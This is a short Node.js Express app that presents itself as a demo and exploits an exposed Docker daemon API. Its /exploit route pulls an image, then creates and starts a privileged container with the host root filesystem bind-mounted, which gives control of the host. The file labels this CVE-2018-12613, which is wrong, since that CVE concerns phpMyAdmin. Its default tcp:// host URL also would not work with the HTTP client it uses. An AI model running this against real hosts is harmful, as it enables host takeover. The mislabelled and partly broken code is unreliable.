const express = require('express');
const axios = require('axios');
const app = express();
const dockerHost = process.env.DOCKER_HOST || 'tcp://localhost:2375';

app.get('/', (req, res) => {
  res.send('CVE-2018-12613 vulnerable Docker API demo. Visit /exploit to trigger RCE.');
});

app.get('/exploit', async (req, res) => {
  try {
    // Craft a malicious container creation request to the exposed Docker daemon
    const createConfig = {
      Image: 'alpine',
      Cmd: ['sh', '-c', 'while true; do echo vulnerable; sleep 60; done'],
      HostConfig: {
        Privileged: true,
        Binds: ['/:/host']
      }
    };
    // Pull the image first (if not present)
    await axios.post(`${dockerHost}/images/create?fromImage=alpine`);
    // Create the container
    const createResp = await axios.post(`${dockerHost}/containers/create`, createConfig);
    const containerId = createResp.data.Id;
    // Start the container
    await axios.post(`${dockerHost}/containers/${containerId}/start`);
    res.send(`Exploit launched. Container ${containerId} is running with privileged access.`);
  } catch (err) {
    console.error(err);
    res.status(500).send('Exploit failed: ' + err.message);
  }
});

app.listen(8080, () => {
  console.log('Web app listening on port 8080');
});